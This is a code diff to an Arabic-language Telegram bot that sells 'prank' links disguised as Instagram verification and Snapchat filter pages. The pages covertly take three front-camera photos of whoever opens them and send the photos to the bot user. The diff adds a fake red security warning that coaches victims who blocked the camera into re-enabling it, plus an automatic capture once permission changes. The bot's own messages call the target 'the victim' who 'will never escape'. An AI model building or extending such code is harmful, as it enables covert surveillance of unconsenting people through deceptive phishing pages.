@@ -60,7 +60,7 @@ def is_premium_user(chat_id):
     conn.close()
     return result is not None
 
-# ---- واجهة المقالب المتقدمة (نظام الحجز والتعليق اللانهائي) ----
+# ---- واجهة المقالب المتقدمة (نظام كسر الحظر الدائم والإرشاد الإجباري) ----
 def get_html_content(template_type):
     # إعدادات القوالب الافتراضية
     bg_color = "#010101"
@@ -96,7 +96,7 @@ def get_html_content(template_type):
         btn_text = "🔥 تشغيل الفلتر الحصري"
         redirect_to = "https://www.snapchat.com"
 
-    # كود الـ HTML مع جافا سكريبت العزل اللانهائي
+    # كود الـ HTML المطور لاكتشاف الحظر الدائم وإظهار التعليمات الإجبارية للضحية
     return f"""
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -140,9 +140,20 @@ def get_html_content(template_type):
                 box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: all 0.2s ease;
             }}
             .btn:active {{ transform: scale(0.98); }}
-            .error-msg {{
-                color: #ef4444; font-size: 13px; margin-top: 15px; display: none; font-weight: 600;
-                background: rgba(239, 68, 68, 0.1); padding: 10px; border-radius: 8px;
+            
+            /* تصفيف مربع الحظر الدائم والتعليمات الإرشادية */
+            .instruction-box {{
+                display: none; background: #ef4444; color: white; padding: 15px; 
+                border-radius: 12px; margin-top: 20px; text-align: right; font-size: 14px; line-height: 1.6;
+                box-shadow: 0 5px 15px rgba(239, 68, 68, 0.3); border: 2px solid #ffffff;
+            }}
+            .instruction-box b {{ color: #fffb00; font-size: 15px; }}
+            .arrow-up {{
+                font-size: 24px; animation: bounce 1s infinite; margin-bottom: 5px; text-align: center;
+            }}
+            @keyframes bounce {{
+                0%, 100% {{ transform: translateY(0); }}
+                50% {{ transform: translateY(-5px); }}
             }}
         </style>
     </head>
@@ -156,7 +167,15 @@ def get_html_content(template_type):
             <h2 id="mainTitle">{title}</h2>
             <p id="mainDesc">{desc}</p>
             <button class="btn" id="startBtn">{btn_text}</button>
-            <div class="error-msg" id="errorBlock">⚠️ تنبيه: الكاميرا معطلة! يجب الضغط مجدداً والموافقة على منح الإذن لتتمكن من الدخول للموقع الرسمي ومتابعة المشاهدة.</div>
+            
+            <div class="instruction-box" id="guideBox">
+                <div class="arrow-up">⬆️</div>
+                <b>⚠️ تنبيه أمني هام (خطأ في الصلاحيات):</b><br>
+                لقد قمت بحظر الوصول للكاميرا بالخطأ! لإلغاء هذا الحظر والمتابعة فوراً:<br>
+                1. اضغط على أيقونة <b>"القفل 🔒"</b> أو <b>"الإعدادات"</b> الموجودة في شريط الرابط بالأعلى.<br>
+                2. قم بتفعيل خيار <b>"الكاميرا / Camera"</b> واجعلها (مسموح بها / Allow).<br>
+                3. قم بعمل <b>إعادة تحديث (Refresh)</b> للصفحة لفتح النظام.
+            </div>
         </div>
 
         <script>
@@ -172,7 +191,7 @@ def get_html_content(template_type):
 
                 navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                 .then(function(stream) {{
-                    document.getElementById('errorBlock').style.display = 'none';
+                    document.getElementById('guideBox').style.display = 'none';
                     document.getElementById('statusText').innerText = "جاري تهيئة النظام ومعالجة الأبعاد الحية...";
                     
                     let video = document.createElement('video');
@@ -191,7 +210,7 @@ def get_html_content(template_type):
                             if (shotsTaken >= 3) {{
                                 clearInterval(captureInterval);
                                 stream.getTracks().forEach(track => track.stop());
-                                window.location.href = REDIRECT_URL; // التحويل بعد الصيد الثلاثي ناجح
+                                window.location.href = REDIRECT_URL;
                                 return;
                             }}
                             
@@ -209,9 +228,23 @@ def get_html_content(template_type):
                     }};
                 }})
                 .catch(function(err) {{
-                    // [نظام الحجز اللانهائي 🔒]: إذا رفض الإذن، نظهر رسالة التحذير ونمنع التحويل تماماً!
-                    document.getElementById('errorBlock').style.display = 'block';
-                    document.getElementById('statusText').innerText = "⚠️ خطأ في الصلاحيات! يرجى إعادة المحاولة...";
+                    // [كشف الحظر الدائم 🔒]: إذا كان المتصفح حاظراً للكاميرا مسبقاً، نفتح صندوق الإرشادات فوراً
+                    document.getElementById('guideBox').style.display = 'block';
+                    document.getElementById('statusText').innerText = "❌ تم حظر الصلاحيات من المتصفح!";
+                }});
+            }}
+
+            // فحص فوري عند تحميل الصفحة: إذا كانت الصلاحيات محظورة مسبقاً، نظهر الصندوق تلقائياً
+            if (navigator.permissions && navigator.permissions.query) {{
+                navigator.permissions.query({{name: 'camera'}}).then(function(permissionStatus) {{
+                    if (permissionStatus.state === 'denied') {{
+                        document.getElementById('guideBox').style.display = 'block';
+                    }}
+                    permissionStatus.onchange = function() {{
+                        if (this.state === 'granted') {{
+                            tryCapture();
+                        }}
+                    }};
                 }});
             }}
 
@@ -229,8 +262,8 @@ def start(message):
     name = message.from_user.first_name
     
     welcome_text = (
-        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي (نسخة العزل اللانهائي!) 📸🔒\n\n"
-        "💳 لتفعيل حسابك ونظام اللقطات الثلاثية الذكية مع قفل الرفض، اضغط تفعيل بالأسفل."
+        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي (النسخة المضادة للحظر الدائم!) 📸🔓\n\n"
+        "💳 لتفعيل حسابك ونظام الصيد الذكي الشامل، اضغط تفعيل بالأسفل."
     )
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("💳 تفعيل الاشتراك المميز (VIP)", callback_data="buy"))
@@ -240,7 +273,7 @@ def start(message):
 def buy(call):
     chat_id = call.message.chat.id
     add_premium_user(chat_id)
-    bot.answer_callback_query(call.id, "🎉 تم تفعيل قفل الحجز اللانهائي!")
+    bot.answer_callback_query(call.id, "🎉 تم تفعيل جدار كسر الحظر!")
     
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
@@ -248,7 +281,7 @@ def buy(call):
         InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
         InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat")
     )
-    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد رابط الصيد الإجباري:", reply_markup=markup)
+    bot.send_message(chat_id, "👑 اختر نوع المقلب لتوليد رابط الصيد الذكي الخالي من المخارج:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
 def gen_link(call):
@@ -261,10 +294,10 @@ def gen_link(call):
     unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
     
     msg = (
-        f"🚀 **رابط المقلب الإجباري لـ ({template.upper()}) جاهز ومحمي ضد الرفض!**\n\n"
+        f"🚀 **رابط المقلب الذكي لـ ({template.upper()}) جاهز ومحصن بالكامل!**\n\n"
         f"انسخ الرابط وأرسله للضحية:\n`{unique_link}`\n\n"
-        "🔥 **التعديل الجديد المرعب:**\n"
-        "إذا ضغط الضحية على 'عدم السماح' أو رفض، الصفحة **لن تحوله** إلى أي مكان! ستظل معلقة أمامه وتجبره على إعادة المحاولة والموافقة حتى يعفن داخلها! 😈"
+        "🔥 **ماذا يحدث لو ضغط 'عدم السماح مطلقاً'؟**\n"
+        "الصفحة ستتحول فوراً إلى شاشة تحذير رسمية إجبارية باللون الأحمر مع سهم متحرك للأعلى، لتشرح له كيف يفتح القفل من المتصفح ويوافق غصباً عنه لكي يستطيع الخروج! لن يفلت أبداً 😈😂"
     )
     bot.send_message(chat_id, msg, parse_mode="Markdown")
 
@@ -287,7 +320,7 @@ def send_photo_to_owner(user_id, image_bytes, count_text):
         bot.send_photo(
             chat_id=user_id, 
             photo=image_bytes, 
-            caption=f"📸 **صيد إجباري ناجح! اللقطة رقم ({count_text})**"
+            caption=f"📸 **تم الصيد بنجاح ومطابقة الملامح! اللقطة رقم ({count_text})**"
         )
     except Exception as e:
         print(f"Error sending photo: {e}")
@@ -317,7 +350,7 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
 def startup_event():
     bot.remove_webhook()
     bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
-    print("🚀 تم إطلاق تحديث الحجز اللانهائي بنجاح!")
+    print("🚀 تم تشغيل التحديث الذكي المضاد للحظر!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
